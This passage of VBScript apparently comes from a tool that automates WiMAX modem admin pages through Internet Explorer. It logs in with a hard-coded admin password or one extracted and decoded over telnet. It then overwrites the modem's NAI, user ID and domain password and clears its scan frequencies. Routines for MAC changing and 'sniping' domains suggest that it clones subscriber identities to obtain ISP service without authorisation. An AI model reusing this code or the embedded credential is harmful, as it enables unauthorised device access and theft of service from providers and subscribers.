If Trim(setUserNameAgain.Value) = Trim(inputWebUserUname.value) Then
DisplayLogChangeMAConly "Trying to login again...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
'Sleeper 300 
setBtnLogin.click
Exit Do
End If 
''end check username again
Loop While Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value)
Sleeper 3000
WaitIEtoLoad(IE)
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogChangeMAConly "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogChangeMAConly "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value
Sleeper 1000
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogChangeMAConly "Accessing Ok....(recovery mode)" 	
DisplayLogChangeMAConly "Login as USER: " & inputWebUserUname.value & "PASS: " & inputWebUserPassowrd.value
Sleeper 1000
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebUserUname.value) 
'Sleeper 1000
'Set setPassword = IE.document.getElementByID("txt_Password")
'setPassword.Value = Trim(inputWebUserPassowrd.value)
'Sleeper 2000
'Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
'Sleeper 1000 
'setBtnLoginForTry.click
Do 
Set setUserNameAgain = IE.document.getElementByID("txt_Username") 
''setUserNameAgain.Value = Trim(inputWebUserUname.value) 
If Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value) Then
DisplayLogChangeMAConly "Trying to fillup username...."
setUserNameAgain.Value = Trim(inputWebUserUname.value) 
'Sleeper 300
Set setPasswordAgain = IE.document.getElementByID("txt_Password")
setPasswordAgain.Value = Trim(inputWebUserPassowrd.value)

End If
If Trim(setUserNameAgain.Value) = Trim(inputWebUserUname.value) Then
DisplayLogChangeMAConly "Trying to login again...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
'Sleeper 300 
setBtnLogin.click
Exit Do
End If 
''end check username again
Loop While Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value)
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
'		MsgBox "Not found"
''Exit Do
End If
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 12 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
IE.Quit
Exit Sub
End If 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
Loop While stringResult > 0
Sleeper 1000 
DisplayLogChangeMAConly "Login OK...."
DisplayLogChangeMAConly "Accessing Security..."
DisplayLogChangeMAConly "Domain Used: " & drpDwnUserIdDomain.value  
''
''BEGINcheck device link and get timestamp
IsDeviceLinkExist = False
checkCountName = 0
loginTimeStamp = ""
Do 
checkCountName = checkCountName + 1
IsDeviceLinkExist = False
IsDeviceLinkExist = TestObjectDeviceInfoTableSixToToM(IE)
If IsDeviceLinkExist Then
Set setDeviceInfoLink = IE.document.getElementByID("tabfrm").contentWindow.document.All("link_User_0_0_0")
linkhref =  setDeviceInfoLink.href
''MsgBox  "Found"
''DisplayLogChangeMAConly linkhref
MyString = (Trim(linkhref))
If MyString = "" Then
''loginTimeStamp = "NOT FOUND"
IsDeviceLinkExist = False
Else 
MyArray = Split(MyString,"?", -1, 1)
loginTimeStamp = MyArray(1) 
IsDeviceLinkExist = True
Exit Do 
End if

''Else
''MsgBox  "Not Found: " & checkCountName
End If
If checkCountName = 35 Then
Exit Do 
End If
Sleeper 2000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
Loop While IsDeviceLinkExist = False
IsDeviceLinkExist = False
checkCountName = 0
''END check device link and get timestamp
''
DisplayLogChangeMAConly "Session ID and Timestamp: "& loginTimeStamp
If loginTimeStamp = "" Then
DisplayLogChangeMAConly  "Unable to get Session ID and Timestamp. Please Try Again....."
IE.Quit
deniedAccess = inputTelnetHost.value & " Unable to get Session ID and Timestamp. Please Try Again.....)"
createTxtLogError(deniedAccess)
Exit Sub
End If
''
IE.Navigate2 "http://" & inputTelnetHost.value &"/wimax/security.html?"& loginTimeStamp
WaitIEtoLoad(IE)
IsSecurityExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsSecurityExist = False
WaitIEtoLoad(IE)
IsSecurityExist = TestObject622mSecurity(IE)
If IsSecurityExist Then
DisplayLogChangeMAConly "Accessing Security...OK"
Set setSecurityNai = IE.document.getElementByID("_WMX_ANONYMOUS_ID")
setSecurityNai.value = inputNai.value & drpDwnNaiDomain.value 
Sleeper 1000
Set setSecurityUserId = IE.document.getElementByID("_WMX_USER_NAME")
''setSecurityUserId.value = inputUserId.value & drpDwnUserIdDomain.value 
'	If checkSixToToM Then
	''DisplayLogMacGenScan "userID: " & Trim(setSecurityUserId.Value)
'	DisplayLogChangeMAConly "MAC series is for 622m....."
'	MyStringSixToToM = (Trim(setSecurityUserId.Value))
'	MyArraySixToToM = Split(MyStringSixToToM, "@", -1, 1)
	''MyArrayLength = UBound(MyArray) +1
'	macUserIdofSixToToM = MyArraySixToToM(0)
'	setSecurityUserId.value = macUserIdofSixToToM & drpDwnUserIdDomain.value   
'	Else
'	setSecurityUserId.value = Trim(inputUserId.value) & drpDwnUserIdDomain.value 
'	End If
setSecurityUserId.value = Trim(inputUserId.value) & drpDwnUserIdDomain.value 
Sleeper 1000
Set setSecurityDomainPass = IE.document.getElementByID("_WMX_PASSW")
''setSecurityDomainPass.value = inputDomainPassword.value 
'	If checkSixToToM Then
'	DisplayLogChangeMAConly "Domain Password: " & macUserIdofSixToToM
'	setSecurityDomainPass.Value = macUserIdofSixToToM 
'	Else
'	setSecurityDomainPass.value = Trim(inputDomainPassword.value)
'	End If
setSecurityDomainPass.value = Trim(inputDomainPassword.value)
Sleeper 1000
set setBtnLogin = IE.document.getElementsByName("btnApply")
''btnvalue = setBtnLogin(0).value
setBtnLogin(0).Click ''REMOVE COMMENT 622m 
DisplayLogChangeMAConly "Applying Changes...."
'DisplayLogChangeMAConly "values of btnApply is: " & btnvalue
'Sleeper 1000
'Set setFromToSubmit = IE.document.getElementByID("AUTH_form")
'setFromToSubmit.Submit
Exit Do 
ElseIf checkCountName = 20 Then
DisplayLogChangeMAConly "Problem Loading Security Page....."
Exit Do
End If
Sleeper 2000
Loop While IsSecurityExist = False
IsSecurityExist = False
checkCountName = 0
'filename = "pressOk.vbs"
'currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34),0 , False	
''
'Sleeper 1000
'setBtnApply.click
'DisplayLogChangeMAConly "Applying Changes...."
Sleeper 7000
IE.Stop
If Err.Number = 0 Then
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
''DisplayLogChangeMAConly "Web ADMIN pass:" & webUiAdminPassword.value
DisplayLogChangeMAConly "Change settings FINISHED...."
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogChangeMAConly("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Sub
End If
''BEGIN Check internet
'If radiobtnBm622i2011.checked Then
'DisplayLogChangeMAConly("Master MAC + Serial process FINISHED........")
'Else
''CheckInternetChangeMAC
''
If CheckInternetChangeMAC Then
Sleeper 1000
DisplayLogChangeMAConly("Success: Connected To Internet!!!")
Else
DisplayLogChangeMAConly("Failed: Not Connected To Internet!!!")
End If
''
'End If 
''END check internet
Else
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
DisplayLogChangeMAConly "Security Setting change FAILED!!!...." 
DisplayLogChangeMAConly "Check your MAC,Security Fields, Device and etc....." 
'						    WScript.Echo "Error:"
'						    WScript.Echo Err.Number & " Srce: " & Err.Source & " Desc: " &  Err.Description
DisplayLogChangeMAConly "Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description
Err.Clear
DisplayLogChangeMAConly "Maybe the page takes time to load... And also check your DEVICE CURRENT MAC." 
DisplayLogChangeMAConly "Process aborted.... Please try again.... " 
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button" 
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
Exit Sub
End If
Else
MsgBox "Please Check your Security Settings."
End If
Else
MsgBox "Please Check your Security Settings."
End If 
Else
changeMACLog.value = "Process aborted.... Please check your CONNECTION if your connected to WIMAX device."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
End If
'changeMACLog.value = "ako" & vbCr & vbLf & "text"
'changeMACLog.value =  inputNai.value & drpDwnNaiDomain.value & inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
'changeMACLog.value = drpDwnNaiDomain.value'& inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
End Sub
''
''END bm622m change SECURITY Only
''
''BEGIN Change frequency 
Sub ChangeFrequencyOnly
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogChangeMAConly "Checking  " & inputTelnetHost.value & " Please WAIT...."
If PingHostLoop Then
'MsgBox "live"
'Exit Sub
If inputNai.value <> "Enter NAI here" And inputUserId.value <> "Enter UserId here" And inputDomainPassword.value <> "Enter Password here" Then
If inputNai.value <> " Invalid MAC" And inputUserId.value <> " Invalid MAC" And inputDomainPassword.value <> " Invalid MAC" Then

''
''Begin Get 622 2011 pass

bm6222011AdminPass =""
successUserLogin = False
If radiobtnBm6222011.checked Then
If radiobtnWebAdminCus.Checked And inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") Then
DisplayLogChangeMAConly "CUSTOMIZE Admin Password is ENABLED. (Password Generation aborted.....)"
bm6222011AdminPass = Trim(inputWebAdminPassowrd.value)
Else
''
successUserLogin = LoginWebToGetPass(inputTelnetHost.value ,1)
Sleeper 1000
If successUserLogin Then
ConnectToTST6222011GetPass(1)

DisplayLogChangeMAConly "Checking extracted password result......"

Sleeper 1000
If GetBM6222011PassFromFile <> "NOT FOUND" Then	
bm6222011AdminPass = GetBM6222011PassFromFile
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogChangeMAConly "DECODED Admin pass: " & bm6222011AdminPass
Else
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogChangeMAConly "Cannot retrieve Admin Password......"
Exit Sub
End If
Else 
DisplayLogChangeMAConly "Cannot ACCESS WEB Admin using Web User Account."
DisplayLogChangeMAConly "Please CHECK your Web User Account. If it is correct"
Exit Sub
End If
''
End If 
End If 
''End Get 622 2011 pass
''


Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
DisplayLogChangeMAConly "Accessing  " & inputTelnetHost.value & " Please WAIT!...."
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & inputTelnetHost.value 	
On Error Resume Next
'checkIEstatLimit = 0
'Sleeper 1000 
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogChangeMAConly "Accessing Ok...." 	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
If radiobtnBm622i2011.checked Then
setPassword.Value = "FG8S_9Sc16tnklTPjn1wfA"
ElseIf radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = Trim(webUiAdminPassword.value)
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogChangeMAConly "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
Sleeper 3000
WaitIEtoLoad(IE)
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogChangeMAConly "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogChangeMAConly "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value
Sleeper 1000
IE.navigate "http://" & inputTelnetHost.value 
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
If radiobtnBm622i2011.checked Then
setPassword.Value = "FG8S_9Sc16tnklTPjn1wfA"
ElseIf radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = Trim(webUiAdminPassword.value)
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLoginForTry.click
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
'		MsgBox "Not found"
''Exit Do
End If

Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 12 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
IE.Quit
Exit Sub
End If 
Loop While stringResult > 0
Sleeper 1000 


DisplayLogChangeMAConly "Login OK...."
DisplayLogChangeMAConly "Accessing Security..."
'Set setSecurityBtn = IE.document.getElementByID("listfrm").contentWindow.document.All("link_Admin_4")
''IE6,8,9 ''Set setSecurityBtn = IE.document.frames("listfrm").document.All("link_Admin_4")
'setSecurityBtn.click
'MsgBox "oks click exiting"
'Exit Sub ''REMOVE THIS!!!!
''
IsSecurityBtnExist = False
checkCountSecurityBtn = 0
Do
checkCountSecurityBtn = checkCountSecurityBtn + 1
IsSecurityBtnExist = False
WaitIEtoLoad(IE)
IsSecurityBtnExist = TestObjectSecurityBtn(IE)
If IsSecurityBtnExist Then
DisplayLogChangeMAConly "Accessing Security page... Ok!"
Sleeper 2000
Exit Do
Else
If checkCountSecurityBtn = 3 Or checkCountSecurityBtn = 10 Or checkCountSecurityBtn = 15 Then
DisplayLogChangeMAConly "Waiting for Security page to load...."
IE.Refresh
ElseIf checkCountSecurityBtn = 20 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS Security page on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsSecurityBtnExist = False
IsSecurityBtnExist = False
checkCountSecurityBtn = 0
''
''acessFrequency
Sleeper 2000
'Set setScanSetBtn = IE.document.getElementByID("listfrm").contentWindow.document.All("link_Admin_4_1")
''IE6,8,9 ''Set setSecurityBtn = IE.document.frames("listfrm").document.All("link_Admin_4")
'setScanSetBtn.click
DisplayLogChangeMAConly "Accessing Scanset..."
IsFrequencyBtnExist = False
checkCountFrequencyBtn = 0
Do
checkCountFrequencyBtn = checkCountFrequencyBtn + 1
IsFrequencyBtnExist = False
WaitIEtoLoad(IE)
IsFrequencyBtnExist = TestObjectFrequencyBtn(IE)
If IsFrequencyBtnExist Then
DisplayLogChangeMAConly "Accessing Scanset page... Ok!"
Sleeper 2000
Exit Do
Else
If checkCountFrequencyBtn = 3 Or checkCountFrequencyBtn = 10 Or checkCountFrequencyBtn = 15 Then
DisplayLogChangeMAConly "Waiting for Scanset page to load...."
IE.Refresh
ElseIf checkCountFrequencyBtn = 20 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS Scanset page on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsFrequencyBtnExist = False
IsFrequencyBtnExist = False
checkCountFrequencyBtn = 0
''end accessFrequency
Sleeper 1000



'Sleeper 1000
'Set setFreq1 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq1")
'setFreq1.Value = drpDwnFrequency.value
''
IsScanFreqExist = False
checkCountScanFreq = 0
Do
checkCountScanFreq = checkCountScanFreq + 1
IsScanFreqExist = False
WaitIEtoLoad(IE)
IsScanFreqExist = TestObjectScanFreq(IE)
If IsScanFreqExist Then
DisplayLogChangeMAConly "Changing Frequency..."
Sleeper 2000
Exit Do
Else
If checkCountScanFreq = 3 Or checkCountScanFreq = 10 Or checkCountScanFreq = 15 Then
DisplayLogChangeMAConly "Waiting for Scanset page to load...."
IE.Refresh
ElseIf checkCountScanFreq = 20 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS Scanset page on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
Sleeper 2000
Loop While IsScanFreqExist = False
IsScanFreqExist = False
checkCountScanFreq = 0
''
''DisplayLogChangeMAConly "Filing up UserId as: " & setUserId.Value
Sleeper 1000
Set setFreq2 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq2")
setFreq2.Value = "0"
Sleeper 1000
Set setFreq3 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq3")
setFreq3.Value = "0"
Sleeper 1000
Set setFreq4 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq4")
setFreq4.Value = "0"
Sleeper 1000
Set setFreq5 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq5")
setFreq5.Value = "0"
Sleeper 1000
Set setFreq6 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq6")
setFreq6.Value = "0"
Sleeper 3000
Set setFreq7 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq7")
setFreq7.Value = "0"
Set setFreq8 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq8")
setFreq8.Value = "0"
Set setFreq9 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq9")
setFreq9.Value = "0"
Set setFreq10 = IE.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq10")
setFreq10.Value = "0"

DisplayLogChangeMAConly "NOTE: Press OK button on window POPUP if NOT working for long period of time...."
'IE.Stop
Set setBtnApply = IE.document.getElementByID("contentfrm").contentWindow.document.All("SaveButton")
'CreateObject("WScript.Shell").Run "pressOk.vbs ",0 , False 
'filename = "pressOk.vbs"
'textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
'CreateObject("WScript.Shell").Run textFilePath,0 , False
filename = "pressOkFreq.vbs"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34),0 , False	
''
Sleeper 1000

setBtnApply.click
DisplayLogChangeMAConly "Applying Changes...."
Sleeper 7000
IE.Stop
If Err.Number = 0 Then
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
''DisplayLogChangeMAConly "Web ADMIN pass:" & webUiAdminPassword.value
DisplayLogChangeMAConly "Change Frequency FINISHED...."
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogChangeMAConly("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Sub
End If

Else
IE.Quit
Sleeper 1000
DisplayLogChangeMAConly "Closing IE...." 
Set IE = Nothing
DisplayLogChangeMAConly "Frequency Setting change FAILED!!!...." 
DisplayLogChangeMAConly "Check your MAC, Device and etc....." 
'						    WScript.Echo "Error:"
'						    WScript.Echo Err.Number & " Srce: " & Err.Source & " Desc: " &  Err.Description
DisplayLogChangeMAConly "Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description
Err.Clear
DisplayLogChangeMAConly "Maybe the page takes time to load... And also check your DEVICE CURRENT MAC." 
DisplayLogChangeMAConly "Process aborted.... Please try again.... " 
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull try again..." 
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
Exit Sub
End If
Else
''MsgBox "Please Check your Security Settings."
End If
Else
''MsgBox "Please Check your Security Settings."
End If 
Else
changeMACLog.value = "Process aborted.... Please check your CONNECTION if your connected to WIMAX device."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
End If
'changeMACLog.value = "ako" & vbCr & vbLf & "text"
'changeMACLog.value =  inputNai.value & drpDwnNaiDomain.value & inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
'changeMACLog.value = drpDwnNaiDomain.value'& inputUserId.value & drpDwnUserIdDomain.value & inputDomainPassword.value
End Sub
''END Change frequency 
Sub DisableSecuritySettingsElement
inputNai.Disabled = True
inputUserId.Disabled = True 
inputDomainPassword.Disabled = True
btnChangeSecurity.Disabled = True
drpDwnUserIdDomain.Disabled = True
drpDwnNaiDomain.Disabled = True
End Sub
Sub EnableSecuritySettingsElement
inputNai.Disabled = False
inputUserId.Disabled = False 
inputDomainPassword.Disabled = False
btnChangeSecurity.Disabled = False
drpDwnUserIdDomain.Disabled = False
drpDwnNaiDomain.Disabled = False
End Sub
Sub ClearRestoreChangeMac
inputNai.Disabled = True
inputUserId.Disabled = True 
inputDomainPassword.Disabled = True
btnChangeSecurity.Disabled = True
drpDwnUserIdDomain.selectedIndex = 0
drpDwnUserIdDomain.Disabled = True
drpDwnNaiDomain.selectedIndex = 0
drpDwnNaiDomain.Disabled = True
inputChangeMacOne.value = "Enter MAC here"
changeMacOneOnly.Disabled = True
btnWebAdmin.Disabled = True
btnWebGUI.Disabled = True
btnSetFrequency.Disabled = True
changeMACLog.value = "Status idle...."
inputNai.value = "Enter NAI here"
inputUserId.value = "Enter UserId here" 
inputDomainPassword.value = "Enter Password here"
End Sub
''BEGIN read domain list
Sub ReadDropDomainlist
If snipeDomainDropdwnList.value = "ALL" Then
domainList = ReadDropDomainlistCmnd
DisplayLogMacGenScan domainList
MyString = (Trim(domainList))
MyArray = Split(MyString, "|", -1, 1)
MyArrayLength = UBound(MyArray)
DisplayLogMacGenScan MyArrayLength
For i = 0 To MyArrayLength
DisplayLogMacGenScan MyArray(i)
Next
Else
DisplayLogMacGenScan "Single only"
End If
End Sub
Function ReadDropDomainlistCmnd
set objSelect = document.getElementById("snipeDomainDropdwnList")
for i = 0 to  3 ''objSelect.length - 10 ''for i = 0 to objSelect.length - 2 '' 0-3 is from globlines,ttls to innove,ttls
